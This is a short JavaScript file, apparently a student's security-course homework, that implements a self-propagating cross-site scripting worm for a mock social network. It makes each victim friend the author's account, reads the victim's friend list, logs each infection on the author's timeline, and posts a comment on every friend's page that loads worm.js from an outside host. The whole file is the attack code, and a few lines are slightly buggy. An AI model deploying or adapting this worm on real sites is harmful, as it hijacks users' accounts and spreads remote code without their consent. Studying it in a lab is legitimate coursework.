// One wormy boi for CSEC-380 hmwk6

// Get the user to friend me
$.get("add_friend.php", {'id': 68})

// Loop through their friends and post worm on their pages
// TODO:
// This line gets a user id as index[0]
$.get("friends.php", function(friends){
    // Always start second split at index[1] to avoid garbage
    myFriends = friends.split("?id=")
    for(var i = 1; i < myFriends.length; i++){
        friendID = myFriends[i].split("'>");
        // Call the function to post to the victims page
        report(friendID)
    }
});

// Function to post worm on a person's page
function spread(id){
    $.get("add_comment.php", {'id': id, 'comment': "<script src='http://nutsplash.zone/worm.js></script>"})
}

function report(id){
    // Post report on my page
    $.get("timeline.php", {'id': 68}, function(timeline){
        // Check if they have posted already
        if(!timeline.includes(id + ":wormyboi")){
            $.get("/add_comment.php", {'id': 68, 'comment': id + ":wormyboi " + new Date(Date.now()).toLocaleString()})
            spread(friendID)
        }
    })
}